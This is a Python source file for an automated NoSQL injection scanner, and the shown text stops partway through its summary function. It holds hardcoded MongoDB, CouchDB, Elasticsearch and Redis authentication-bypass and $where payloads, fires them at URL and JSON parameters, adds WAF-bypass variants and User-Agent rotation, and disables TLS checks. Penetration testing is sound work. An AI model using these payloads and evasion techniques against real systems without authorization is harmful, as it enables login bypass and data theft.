# nosql_injection.py
# Advanced NoSQL injection detector with multiple database support

import statistics
import time
import requests
import urllib3
import random
import json
import re
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from datetime import datetime

# Import your modules
from user_agents import AdvancedUserAgentRotator
from payload_generator import BasicDetectionPayloads, AdvancedDetectionPayloads, EnhancedPayloadGenerator
from bypass import AdvancedWAFBypass, SmartWAFBypass, generate_smart_bypass_payloads

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration / constants ------------------------------------------------
DEFAULT_SAMPLE_SIZE = 4
DEFAULT_CONFIDENCE_THRESHOLD = 0.8
MAX_PARALLEL_PAYLOADS = 6
DEFAULT_DELAY = 0.3

# Detection modes
DETECTION_MODES = {
    'basic': 'BasicDetectionPayloads only',
    'basic_bypass': 'BasicDetectionPayloads + WAF bypass',
    'advanced': 'AdvancedDetectionPayloads only', 
    'advanced_bypass': 'AdvancedDetectionPayloads + WAF bypass'
}

# NoSQL database types
NOSQL_DATABASES = {
    'mongodb': 'MongoDB',
    'couchdb': 'CouchDB',
    'cassandra': 'Cassandra',
    'redis': 'Redis',
    'elasticsearch': 'Elasticsearch',
    'dynamodb': 'DynamoDB',
    'cosmosdb': 'CosmosDB'
}

# NoSQL injection patterns and operators
NOSQL_OPERATORS = {
    'mongodb': [
        '$eq', '$ne', '$gt', '$gte', '$lt', '$lte', '$in', '$nin',
        '$and', '$or', '$not', '$nor', '$exists', '$type', '$mod',
        '$regex', '$text', '$where', '$all', '$elemMatch', '$size'
    ],
    'couchdb': [
        '$eq', '$ne', '$gt', '$gte', '$lt', '$lte', '$in', '$nin',
        '$exists', '$type', '$mod', '$regex', '$size', '$all'
    ],
    'cassandra': [
        '=', '!=', '>', '>=', '<', '<=', 'IN', 'CONTAINS',
        'CONTAINS KEY', 'LIKE', 'TOKEN'
    ],
    'redis': [
        '==', '!=', '>', '<', '>=', '<=', 'IN', 'MATCH'
    ],
    'elasticsearch': [
        'term', 'terms', 'range', 'exists', 'prefix', 'wildcard',
        'regexp', 'fuzzy', 'type', 'ids', 'bool', 'must', 'must_not',
        'should', 'filter'
    ]
}

# --- Helper utilities --------------------------------------------------------
def detect_nosql_database(response_text: str, headers: Dict) -> str:
    """Detect NoSQL database type from response."""
    indicators = {
        'mongodb': [
            'mongodb', 'mongo', 'ObjectID', 'BSON', 'MongoError',
            'MongoServerError', 'MongoNetworkError'
        ],
        'couchdb': [
            'couchdb', 'CouchDB', 'erlang', 'Apache CouchDB'
        ],
        'cassandra': [
            'cassandra', 'Cassandra', 'cql', 'CQL', 'NoHostAvailable'
        ],
        'redis': [
            'redis', 'Redis', 'REDIS', 'wrong number of arguments',
            'ERR wrong number of arguments'
        ],
        'elasticsearch': [
            'elasticsearch', 'Elasticsearch', 'es_', 'index_not_found',
            'SearchPhaseExecutionException'
        ],
        'dynamodb': [
            'dynamodb', 'DynamoDB', 'AWS.DynamoDB', 'Amazon DynamoDB'
        ],
        'cosmosdb': [
            'cosmosdb', 'CosmosDB', 'Azure Cosmos DB', 'DocumentClientException'
        ]
    }
    
    # Check response text
    for db_type, patterns in indicators.items():
        for pattern in patterns:
            if pattern.lower() in response_text.lower():
                return db_type
    
    # Check headers
    server_header = headers.get('Server', '').lower()
    x_powered_by = headers.get('X-Powered-By', '').lower()
    
    for db_type, patterns in indicators.items():
        for pattern in patterns:
            if pattern.lower() in server_header or pattern.lower() in x_powered_by:
                return db_type
    
    return 'unknown'

def parse_json_payload(payload: str) -> Tuple[bool, Any]:
    """Safely parse JSON payload with error handling."""
    try:
        return True, json.loads(payload)
    except (json.JSONDecodeError, TypeError):
        return False, payload

def generate_nosql_payload(db_type: str, payload_type: str, field: str = 'username') -> Dict[str, Any]:
    """Generate NoSQL payload based on database type and payload type."""
    base_payloads = {
        'mongodb': {
            'authentication_bypass': [
                {f"{field}": {"$ne": None}},
                {f"{field}": {"$ne": ""}},
                {f"{field}": {"$exists": True}},
                {f"{field}": {"$regex": ".*"}},
                {"$where": "true"},
                {"$or": [{f"{field}": {"$ne": None}}, {f"{field}": {"$exists": True}}]},
                {"$and": [{f"{field}": {"$ne": None}}, {"1": "1"}]}
            ],
            'boolean_based': [
                {f"{field}": {"$eq": "admin"}},
                {f"{field}": {"$ne": "admin"}},
                {"$where": "this.username == 'admin'"},
                {"$where": "this.username != 'admin'"}
            ],
            'error_based': [
                {f"{field}": {"$type": "invalid"}},
                {"$where": "throw new Error('test')"},
                {"$where": "undefined_variable"}
            ],
            'time_based': [
                {"$where": "sleep(1000) || true"},
                {"$where": "Date.now() > 0"}
            ]
        },
        'couchdb': {
            'authentication_bypass': [
                {f"{field}": {"$ne": None}},
                {f"{field}": {"$ne": ""}},
                {f"{field}": {"$exists": True}}
            ],
            'boolean_based': [
                {f"{field}": "admin"},
                {f"{field}": {"$ne": "admin"}}
            ]
        },
        'cassandra': {
            'authentication_bypass': [
                {f"{field}": {"$ne": None}},
                {f"{field}": "admin"}
            ]
        },
        'elasticsearch': {
            'authentication_bypass': [
                {"query": {"match_all": {}}},
                {"query": {"bool": {"must": [{"match": {f"{field}": "admin"}}]}}},
                {"query": {"wildcard": {f"{field}": "*"}}}
            ],
            'boolean_based': [
                {"query": {"term": {f"{field}": "admin"}}},
                {"query": {"terms": {f"{field}": ["admin"]}}}
            ]
        },
        'redis': {
            'authentication_bypass': [
                ["*"],
                ["admin", "*"],
                [f"{field}", "*"]
            ]
        }
    }
    
    # Get payloads for specific database or use generic MongoDB as fallback
    db_payloads = base_payloads.get(db_type, base_payloads['mongodb'])
    return db_payloads.get(payload_type, db_payloads['authentication_bypass'])

# --- Enhanced HTTP Session ---------------------------------------------------
class ResilientHTTPSession:
    """HTTP session with retry logic and connection pooling."""
    
    def __init__(self, max_retries: int = 3, backoff_factor: float = 0.5):
        self.session = requests.Session()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self._setup_session()
    
    def _setup_session(self):
        """Configure session with retry strategy."""
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504, 403],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Default headers
        self.session.headers.update({
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with enhanced error handling."""
        # Ensure verify=False for SSL
        kwargs['verify'] = False
        kwargs['timeout'] = kwargs.get('timeout', 30)
        kwargs['allow_redirects'] = kwargs.get('allow_redirects', False)
        
        return self.session.request(method, url, **kwargs)
    
    def close(self):
        """Close session."""
        self.session.close()

# --- Main Detector -----------------------------------------------------------
class AdvancedNoSQLInjectionDetector:
    """
    Enhanced NoSQL Injection Detector with multiple database support.
    """

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.sample_size = self.config.get('sample_size', DEFAULT_SAMPLE_SIZE)
        self.confidence_threshold = self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD)
        self.max_response_time = self.config.get('max_response_time', 30)
        self.max_payloads_per_param = self.config.get('max_payloads_per_param', 25)
        self.detection_mode = self.config.get('detection_mode', 'advanced_bypass')
        self.use_smart_bypass = self.config.get('use_smart_bypass', False)
        self.payloads_directory = self.config.get('payloads_directory', 'payloads')
        self.delay = self.config.get('delay', DEFAULT_DELAY)
        self.detected_db = 'unknown'

        # Initialize components based on detection mode
        self._initialize_components()
        
        # HTTP session
        self.http_session = ResilientHTTPSession(
            max_retries=self.config.get('max_retries', 3),
            backoff_factor=self.config.get('backoff_factor', 0.5)
        )

        # Internal state
        self.request_history: List[Dict[str, Any]] = []
        self.baseline_responses: List[Dict] = []
        self.learning_data = []
        self.detected_databases = set()

        # Logging
        self.logger = self._setup_logging()
        self.logger.info(f"Initialized NoSQL injection detector with mode: {self.detection_mode}")

    def _initialize_components(self):
        """Initialize detection components based on selected mode."""
        # Always initialize these
        self.ua_rotator = AdvancedUserAgentRotator()
        self.waf_bypass = AdvancedWAFBypass()
        self.smart_bypass = SmartWAFBypass() if self.use_smart_bypass else None
        
        # Initialize payload sources based on mode
        if self.detection_mode in ['basic', 'basic_bypass']:
            self.payload_source = BasicDetectionPayloads()
            self.advanced_payloads = None
            self.payload_generator = None
        else:
            self.payload_source = BasicDetectionPayloads()  # Fallback
            self.advanced_payloads = AdvancedDetectionPayloads(self.payloads_directory)
            self.payload_generator = EnhancedPayloadGenerator(
                use_bypass=(self.detection_mode == 'advanced_bypass'),
                payloads_directory=self.payloads_directory,
                smart_learning=self.use_smart_bypass
            )

    def _setup_logging(self):
        logger = logging.getLogger('AdvancedNoSQLInjectionDetector')
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    # ----------------- Enhanced Payload Management -------------------
    def _collect_nosql_payloads(self, db_hint: str = 'auto') -> List[Dict[str, Any]]:
        """
        Collect NoSQL payloads based on detection mode.
        """
        payloads = []
        
        if self.detection_mode in ['basic', 'basic_bypass']:
            payloads = self._get_basic_nosql_payloads(db_hint)
        else:
            payloads = self._get_advanced_nosql_payloads(db_hint)
        
        # Apply bypass if enabled in mode
        if self.detection_mode in ['basic_bypass', 'advanced_bypass']:
            payloads = self._apply_bypass_to_payloads(payloads)
        
        return payloads[:self.max_payloads_per_param]

    def _get_basic_nosql_payloads(self, db_hint: str) -> List[Dict[str, Any]]:
        """Get NoSQL payloads from BasicDetectionPayloads."""
        payloads = []
        pb = self.payload_source
        all_payloads = pb.get_all_payloads()
        
        # Get NoSQL payloads
        nosql_payloads = all_payloads.get('nosql', {})
        
        # Process database-specific payloads
        db_priority = ['mongodb', 'couchdb', 'cassandra', 'redis', 'elasticsearch']
        if db_hint != 'auto' and db_hint in db_priority:
            db_priority = [db_hint] + [db for db in db_priority if db != db_hint]
        elif self.detected_db != 'unknown':
            db_priority = [self.detected_db] + db_priority
        
        for db_type in db_priority:
            db_payloads = nosql_payloads.get(f'{db_type}_injection', [])
            for p in db_payloads:
                if isinstance(p, str):
                    payloads.append({
                        'payload': p,
                        'db': db_type,
                        'base_confidence': 0.8,
                        'description': f"{db_type} NoSQL injection",
                        'payload_type': 'authentication_bypass',
                        'source': 'basic'
                    })
                elif isinstance(p, dict):
                    payloads.append({
                        'payload': json.dumps(p),
                        'db': db_type,
                        'base_confidence': 0.85,
                        'description': f"{db_type} JSON operator",
                        'payload_type': 'operator_injection',
                        'source': 'basic'
                    })
        
        # Add generic NoSQL payloads
        generic_payloads = [
            '{"$ne": null}', '{"$ne": ""}', '{"$exists": true}',
            '{"$gt": ""}', '{"$where": "true"}', '{"$or": [{"a": "a"}, {"b": "b"}]}',
            'admin\' || \'1\'==\'1', 'admin\' || 1==1//',
            '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}'
        ]
        
        for p in generic_payloads:
            payloads.append({
                'payload': p,
                'db': 'generic',
                'base_confidence': 0.7,
                'description': "Generic NoSQL injection",
                'payload_type': 'authentication_bypass',
                'source': 'basic'
            })
        
        return payloads

    def _get_advanced_nosql_payloads(self, db_hint: str) -> List[Dict[str, Any]]:
        """Get NoSQL payloads from AdvancedDetectionPayloads."""
        payloads = []
        
        if not self.advanced_payloads:
            return self._get_basic_nosql_payloads(db_hint)
        
        # Get payloads by database type
        if db_hint != 'auto':
            db_payloads = self.advanced_payloads.get_payloads_by_database(db_hint)
        else:
            # Get all NoSQL payloads
            db_payloads = self.advanced_payloads.get_payloads_by_attack_type('nosql')
        
        # Flatten and process payloads
        for category, payload_list in db_payloads.items():
            for p in payload_list:
                if any(keyword in p.lower() for keyword in ['$ne', '$eq', '$gt', '$where', '$or', '||', '&&']):
                    payloads.append({
                        'payload': p,
                        'db': db_hint,
                        'base_confidence': 0.85,
                        'description': f"Advanced {category}",
                        'payload_type': self._classify_payload_type(p),
                        'source': 'advanced'
                    })
        
        # Generate dynamic payloads based on detected database
        if self.detected_db != 'unknown' or db_hint != 'auto':
            target_db = self.detected_db if self.detected_db != 'unknown' else db_hint
            dynamic_payloads = self._generate_dynamic_payloads(target_db)
            payloads.extend(dynamic_payloads)
        
        # Add basic payloads as fallback
        if not payloads:
            payloads = self._get_basic_nosql_payloads(db_hint)
        
        return payloads

    def _generate_dynamic_payloads(self, db_type: str) -> List[Dict[str, Any]]:
        """Generate dynamic NoSQL payloads based on database type."""
        payloads = []
        
        payload_types = ['authentication_bypass', 'boolean_based', 'error_based']
        
        for payload_type in payload_types:
            generated = generate_nosql_payload(db_type, payload_type)
            for payload in generated[:3]:  # Limit to 3 per type
                payloads.append({
                    'payload': json.dumps(payload),
                    'db': db_type,
                    'base_confidence': 0.9,
                    'description': f"{db_type} {payload_type}",
                    'payload_type': payload_type,
                    'source': 'dynamic'
                })
        
        return payloads

    def _classify_payload_type(self, payload: str) -> str:
        """Classify NoSQL payload type."""
        payload_lower = payload.lower()
        
        if any(op in payload_lower for op in ['$ne', '$exists', '$regex']):
            return 'authentication_bypass'
        elif any(op in payload_lower for op in ['$eq', '$where', '==']):
            return 'boolean_based'
        elif any(op in payload_lower for op in ['$type', 'throw', 'undefined']):
            return 'error_based'
        elif any(op in payload_lower for op in ['sleep', 'date.now']):
            return 'time_based'
        else:
            return 'operator_injection'

    def _apply_bypass_to_payloads(self, original_payloads: List[Dict]) -> List[Dict]:
        """Apply WAF bypass techniques to NoSQL payloads."""
        bypassed_payloads = []
        
        for original in original_payloads[:15]:  # Limit for performance
            raw_payload = original['payload']
            
            # Apply smart bypass if enabled
            if self.use_smart_bypass and self.smart_bypass:
                try:
                    smart_variants = self.smart_bypass.get_optimized_bypass(raw_payload, self.waf_bypass)
                    for variant in smart_variants[:2]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'base_confidence': original['base_confidence'] * 0.95,
                            'description': original['description'] + ' (smart bypass)',
                            'payload_type': original.get('payload_type', 'authentication_bypass'),
                            'source': original['source'] + '_bypass'
                        })
                except Exception as e:
                    self.logger.debug(f"Smart bypass failed: {e}")
            
            # Apply standard bypass techniques
            try:
                bypass_variants = self.waf_bypass.apply_all_bypasses(raw_payload, max_variations=2)
                for variant in bypass_variants:
                    if variant not in [p['payload'] for p in bypassed_payloads]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'base_confidence': original['base_confidence'] * 0.9,
                            'description': original['description'] + ' (bypass)',
                            'payload_type': original.get('payload_type', 'authentication_bypass'),
                            'source': original['source'] + '_bypass'
                        })
            except Exception as e:
                self.logger.debug(f"Standard bypass failed: {e}")
        
        # Combine original and bypassed payloads
        all_payloads = original_payloads + bypassed_payloads
        
        # Deduplicate
        seen = set()
        deduped = []
        for pl in all_payloads:
            if pl['payload'] not in seen:
                deduped.append(pl)
                seen.add(pl['payload'])
        
        return deduped

    # ----------------- Baseline Measurement -------------------
    def calculate_baseline(self, url: str, method: str = 'GET', headers: Dict = None, 
                         data: Dict = None, cookies: Dict = None, samples: int = 3) -> List[Dict]:
        """Measure baseline responses and detect NoSQL database."""
        self.logger.info(f"Calculating baseline with {samples} samples for {url}")
        baseline_responses = []
        headers = self._prepare_headers(headers)
        
        for i in range(samples):
            try:
                ok, response_text, sc, content_type, resp_headers = self._send_request(
                    url, method, headers=headers, data=data, cookies=cookies, safe_mode=True
                )
                if ok:
                    response_data = {
                        'text': response_text,
                        'status_code': sc,
                        'content_type': content_type,
                        'headers': resp_headers
                    }
                    baseline_responses.append(response_data)
                    
                    # Detect NoSQL database
                    detected_db = detect_nosql_database(response_text, resp_headers)
                    if detected_db != 'unknown':
                        self.detected_db = detected_db
                        self.detected_databases.add(detected_db)
                
                time.sleep(self.delay + random.random() * 0.2)
            except Exception as e:
                self.logger.debug(f"Baseline request {i+1} failed: {e}")
                continue

        self.baseline_responses = baseline_responses
        
        if self.detected_db != 'unknown':
            self.logger.info(f"Detected NoSQL database: {self.detected_db}")
        else:
            self.logger.info("No specific NoSQL database detected, using generic payloads")
        
        self.logger.info(f"Baseline established: {len(baseline_responses)} samples")
        
        return baseline_responses

    # ----------------- HTTP Communication -------------------
    def _prepare_headers(self, headers: Optional[Dict[str,str]] = None) -> Dict[str,str]:
        """Prepare headers with User-Agent rotation."""
        headers = (headers or {}).copy()
        if 'User-Agent' not in headers:
            ua = self.ua_rotator.get_user_agent()
            headers['User-Agent'] = ua
        
        # Ensure JSON content type for POST requests
        if headers.get('Content-Type') is None:
            headers['Content-Type'] = 'application/json'
        
        return headers

    def _send_request(self, url: str, method: str = 'GET', headers: Dict = None, 
                     data: Any = None, cookies: Dict = None, safe_mode: bool = False, 
                     timeout: Optional[int] = None) -> Tuple[bool, str, int, str, Dict]:
        """Send HTTP request with comprehensive error handling."""
        if timeout is None:
            timeout = self.max_response_time

        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        start = time.time()

        try:
            if method.upper() == 'GET':
                resp = self.http_session.request('GET', url, headers=headers, cookies=cookies, timeout=timeout)
            elif method.upper() == 'POST':
                # Handle different data types for NoSQL injection
                if isinstance(data, (dict, list)):
                    payload = json.dumps(data)
                else:
                    payload = data
                
                resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=payload, timeout=timeout)
            else:
                resp = self.http_session.request(method, url, headers=headers, cookies=cookies, data=data, timeout=timeout)

            response_text = resp.text
            rt = time.time() - start
            
            if not safe_mode:
                self.request_history.append({
                    'timestamp': datetime.now(),
                    'response_time': rt,
                    'status_code': resp.status_code,
                    'url': url
                })
                
                # Collect learning data for smart bypass
                if self.use_smart_bypass:
                    self.learning_data.append((url, resp.status_code, resp.text))

            return True, response_text, resp.status_code, resp.headers.get('Content-Type', ''), dict(resp.headers)
            
        except requests.exceptions.Timeout:
            rt = time.time() - start
            self.logger.debug(f"Request timeout after {rt:.2f}s: {url}")
            return False, "Timeout", 0, "", {}
        except requests.RequestException as e:
            rt = time.time() - start
            self.logger.debug(f"Request failed: {e}")
            return False, str(e), 0, "", {}
        except Exception as e:
            rt = time.time() - start
            self.logger.debug(f"Unexpected error: {e}")
            return False, str(e), 0, "", {}

    # ----------------- Injection Helpers -------------------
    def _inject_json_payload(self, original_data: Any, parameter: str, payload: str) -> Any:
        """Inject NoSQL payload into JSON data structures."""
        if isinstance(original_data, str):
            try:
                # Try to parse as JSON first
                data_dict = json.loads(original_data)
                return self._inject_into_json_structure(data_dict, parameter, payload)
            except json.JSONDecodeError:
                # If not JSON, treat as string
                return original_data.replace(f'"{parameter}"', payload)
        
        elif isinstance(original_data, dict):
            return self._inject_into_json_structure(original_data, parameter, payload)
        
        elif isinstance(original_data, list):
            # Handle array of objects
            return [self._inject_into_json_structure(item, parameter, payload) 
                   if isinstance(item, dict) else item for item in original_data]
        
        return original_data

    def _inject_into_json_structure(self, data_structure: Any, key: str, value: str) -> Any:
        """Recursively inject payload into JSON structures."""
        if isinstance(data_structure, dict):
            result = {}
            for k, v in data_structure.items():
                if k == key:
                    # Try to parse value as JSON, otherwise use as string
                    success, parsed_value = parse_json_payload(value)
                    if success:
                        result[k] = parsed_value
                    else:
                        result[k] = value
                else:
                    result[k] = self._inject_into_json_structure(v, key, value)
            return result
        elif isinstance(data_structure, list):
            return [self._inject_into_json_structure(item, key, value) for item in data_structure]
        else:
            return data_structure

    def _build_test_request(self, url: str, method: str, headers: Dict, 
                          data: Any, parameter: str, payload: str) -> Tuple[str, str, Dict, Any]:
        """Build test request with injected NoSQL payload."""
        test_url = url
        test_method = method
        test_headers = headers.copy()
        test_data = data

        if method.upper() == 'GET':
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            # For GET requests, inject as parameter value
            if parameter in query_params:
                query_params[parameter] = [payload]
            else:
                query_params[parameter] = [payload]
            
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            # For POST requests, inject into JSON body
            test_data = self._inject_json_payload(data, parameter, payload)

        return test_url, test_method, test_headers, test_data

    # ----------------- NoSQL Analysis -------------------
    def analyze_nosql_response(self, response_data: Dict, baseline_responses: List[Dict], 
                             payload_type: str) -> Dict[str, Any]:
        """Analyze response for NoSQL injection indicators."""
        response_text = response_data.get('text', '')
        status_code = response_data.get('status_code', 0)
        content_type = response_data.get('content_type', '')
        
        confidence = 0.0
        indicators = []
        
        # Status code analysis
        if status_code == 200:
            confidence += 0.2
            indicators.append("Successful response (200)")
        
        # Content type analysis
        if 'json' in content_type.lower():
            confidence += 0.1
            indicators.append("JSON response")
        
        # Response content analysis
        response_lower = response_text.lower()
        
        # NoSQL-specific indicators
        nosql_indicators = [
            'mongodb', 'couchdb', 'cassandra', 'redis', 'elasticsearch',
            'unexpected token', 'json', 'bson', 'objectid', 'syntax error',
            'parse error', 'invalid', 'unexpected operator', 'operator'
        ]
        
        for indicator in nosql_indicators:
            if indicator in response_lower:
                confidence += 0.1
                indicators.append(f"Found '{indicator}' in response")
        
        # Authentication bypass detection
        if payload_type == 'authentication_bypass' and status_code == 200:
            if len(response_text) > 100:  # Substantial response
                confidence += 0.3
                indicators.append("Substantial response for bypass payload")
        
        # Error-based detection
        if payload_type == 'error_based' and status_code >= 500:
            confidence += 0.4
            indicators.append("Server error for error-based payload")
        
        # Compare with baseline
        if baseline_responses:
            baseline_texts = [r.get('text', '') for r in baseline_responses]
            if response_text not in baseline_texts:
                confidence += 0.2
                indicators.append("Response differs from baseline")
        
        return {
            'confidence': min(1.0, confidence),
            'indicators': indicators,
            'status_code': status_code,
            'response_length': len(response_text),
            'is_vulnerable': confidence >= 0.5
        }

    # ----------------- Core Testing Logic -------------------
    def _test_single_payload(self, test_url: str, method: str, headers: Dict, 
                           data: Any, cookies: Dict, payload_info: Dict) -> Dict[str, Any]:
        """Test a single NoSQL payload with multiple samples."""
        payload = payload_info['payload']
        payload_responses = []
        response_times = []
        
        for i in range(self.sample_size):
            try:
                start = time.time()
                ok, response_text, sc, content_type, resp_headers = self._send_request(
                    test_url, method, headers=headers, data=data, cookies=cookies
                )
                rt = time.time() - start
                response_times.append(rt)
                
                if ok:
                    response_data = {
                        'text': response_text,
                        'status_code': sc,
                        'content_type': content_type,
                        'headers': resp_headers
                    }
                    payload_responses.append(response_data)
                
                time.sleep(self.delay + random.random() * 0.2)
            except Exception as e:
                self.logger.debug(f"Test request {i+1} failed: {e}")
                continue

        # Analyze responses
        analysis_results = []
        for response in payload_responses:
            analysis = self.analyze_nosql_response(
                response, 
                self.baseline_responses,
                payload_info.get('payload_type', 'authentication_bypass')
            )
            analysis_results.append(analysis)
        
        # Aggregate results
        if analysis_results:
            max_confidence = max(result['confidence'] for result in analysis_results)
            avg_confidence = statistics.mean(result['confidence'] for result in analysis_results)
            vulnerable_count = sum(1 for result in analysis_results if result['is_vulnerable'])
        else:
            max_confidence = 0.0
            avg_confidence = 0.0
            vulnerable_count = 0

        return {
            'payload': payload,
            'payload_info': payload_info,
            'payload_responses': payload_responses,
            'analysis_results': analysis_results,
            'response_times': response_times,
            'max_confidence': max_confidence,
            'avg_confidence': avg_confidence,
            'vulnerable_samples': vulnerable_count,
            'total_samples': len(payload_responses)
        }

    def test_parameter(self, url: str, parameter: str, value: str = 'test', 
                     method: str = 'GET', headers: Dict = None, data: Any = None, 
                     cookies: Dict = None, database_type: str = 'auto') -> Dict[str, Any]:
        """Test a specific parameter for NoSQL injection."""
        self.logger.info(f"Testing parameter '{parameter}' with mode: {self.detection_mode}")
        
        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        original_data = data.copy() if hasattr(data, 'copy') else data

        # Calculate baseline if not done
        if not self.baseline_responses:
            self.calculate_baseline(url, method, headers, original_data, cookies)

        # Use detected database or provided hint
        target_db = self.detected_db if self.detected_db != 'unknown' else database_type

        # Get payloads based on detection mode
        all_payloads = self._collect_nosql_payloads(target_db)
        
        self.logger.info(f"Testing {len(all_payloads)} NoSQL payload variants for parameter '{parameter}'")

        results_details = []
        vulnerable_payloads = []

        # Test payloads with threading
        with ThreadPoolExecutor(max_workers=min(MAX_PARALLEL_PAYLOADS, len(all_payloads) or 1)) as executor:
            future_to_payload = {}
            
            for pl in all_payloads:
                test_url, test_method, test_headers, test_data = self._build_test_request(
                    url, method, headers, original_data, parameter, pl['payload']
                )
                
                future = executor.submit(
                    self._test_single_payload, test_url, test_method, test_headers, 
                    test_data, cookies, pl
                )
                future_to_payload[future] = pl

            for future in as_completed(future_to_payload):
                pl = future_to_payload[future]
                try:
                    result = future.result()
                    
                    combined_conf = result['max_confidence'] * pl['base_confidence']
                    
                    result_entry = {
                        'payload': pl['payload'],
                        'database_type': pl['db'],
                        'description': pl.get('description', ''),
                        'payload_type': pl.get('payload_type', 'authentication_bypass'),
                        'analysis_results': result['analysis_results'],
                        'max_confidence': result['max_confidence'],
                        'avg_confidence': result['avg_confidence'],
                        'vulnerable_samples': result['vulnerable_samples'],
                        'total_samples': result['total_samples'],
                        'combined_confidence': combined_conf,
                        'detection_mode': self.detection_mode,
                        'vulnerable': False
                    }

                    if (combined_conf >= self.confidence_threshold and 
                        result['vulnerable_samples'] >= max(2, int(self.sample_size * 0.5))):
                        result_entry['vulnerable'] = True
                        vulnerable_payloads.append(result_entry)

                    results_details.append(result_entry)
                    
                    self.logger.info(
                        f"Payload tested: max_conf={result['max_confidence']:.3f}, "
                        f"combined={combined_conf:.3f}, vulnerable={result_entry['vulnerable']}"
                    )
                    
                except Exception as e:
                    self.logger.error(f"Error testing payload: {e}")

        # Compile final results
        overall_confidence = max((v['combined_confidence'] for v in vulnerable_payloads), default=0.0)
        
        return {
            'parameter': parameter,
            'database_type': target_db,
            'vulnerable': len(vulnerable_payloads) > 0,
            'confidence': overall_confidence,
            'payloads_tested': len(results_details),
            'successful_payloads': vulnerable_payloads,
            'detected_databases': list(self.detected_databases),
            'detection_mode': self.detection_mode,
            'details': results_details
        }

    # ----------------- Scanning Methods -------------------
    def _extract_parameters(self, target: Dict[str, Any]) -> List[str]:
        """Extract all parameters from target configuration."""
        params = []
        
        parsed = urlparse(target['url'])
        params.extend(parse_qs(parsed.query).keys())
        
        if target.get('method', 'GET').upper() == 'POST':
            data = target.get('data')
            if isinstance(data, dict):
                params.extend(data.keys())
            elif isinstance(data, str):
                try:
                    json_data = json.loads(data)
                    if isinstance(json_data, dict):
                        params.extend(json_data.keys())
                except json.JSONDecodeError:
                    # Try to extract from form data
                    params.extend(parse_qs(data).keys())
        
        return list(dict.fromkeys(params))

    def comprehensive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive NoSQL injection scan."""
        self.logger.info(f"Starting comprehensive NoSQL injection scan for {target.get('url')} with mode: {self.detection_mode}")
        
        if not self.baseline_responses:
            self.calculate_baseline(
                target['url'], 
                target.get('method', 'GET'), 
                target.get('headers'), 
                target.get('data'), 
                target.get('cookies')
            )

        parameters = self._extract_parameters(target)
        scan_start = datetime.now()
        
        results = {
            'target': target,
            'detection_mode': self.detection_mode,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'detected_databases': list(self.detected_databases),
            'scan_start': scan_start
        }

        for param in parameters:
            self.logger.info(f"Testing parameter: {param}")
            
            param_result = self.test_parameter(
                target['url'], param,
                value=(target.get('data') or {}).get(param, 'test'),
                method=target.get('method', 'GET'),
                headers=target.get('headers'),
                data=target.get('data'),
                cookies=target.get('cookies'),
                database_type=target.get('database_type', 'auto')
            )
            
            results['parameters_tested'].append(param_result)
            
            if param_result['vulnerable']:
                results['vulnerable_parameters'].append(param_result)

        results['scan_duration'] = (datetime.now() - scan_start).total_seconds()
        results['vulnerability_count'] = len(results['vulnerable_parameters'])
        
        self._generate_scan_summary(results)
        return results

    def adaptive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform adaptive scan with quick first pass and deep follow-up."""
        self.logger.info(f"Starting adaptive NoSQL injection scan with mode: {self.detection_mode}")
        
        # Quick first pass
        original_sample_size = self.sample_size
        self.sample_size = max(2, self.sample_size // 2)
        
        quick_results = self.comprehensive_scan(target)
        
        # Restore original settings
        self.sample_size = original_sample_size

        if quick_results['vulnerability_count'] > 0:
            self.logger.info("Quick scan found potential vulnerabilities - performing deep verification")
            
            deep_results = {
                'target': target,
                'detection_mode': self.detection_mode,
                'parameters_tested': [],
                'vulnerable_parameters': [],
                'detected_databases': list(self.detected_databases)
            }
            
            for vuln_param in quick_results['vulnerable_parameters']:
                param_name = vuln_param['parameter']
                
                self.sample_size = min(6, self.sample_size * 2)
                
                try:
                    verified = self.test_parameter(
                        target['url'], param_name,
                        value=(target.get('data') or {}).get(param_name, 'test'),
                        method=target.get('method', 'GET'),
                        headers=target.get('headers'),
                        data=target.get('data'),
                        cookies=target.get('cookies'),
                        database_type='auto'
                    )
                    
                    deep_results['parameters_tested'].append(verified)
                    
                    if verified['vulnerable']:
                        deep_results['vulnerable_parameters'].append(verified)
                        
                finally:
                    self.sample_size = original_sample_size
            
            deep_results['vulnerability_count'] = len(deep_results['vulnerable_parameters'])
            return deep_results
        else:
            self.logger.info("No vulnerabilities found in quick scan - performing comprehensive scan")
            return self.comprehensive_scan(target)

    def _generate_scan_summary(self, scan_results: Dict[str, Any]):
        """Generate comprehensive scan summary."""
        self.logger.info("=" * 60)
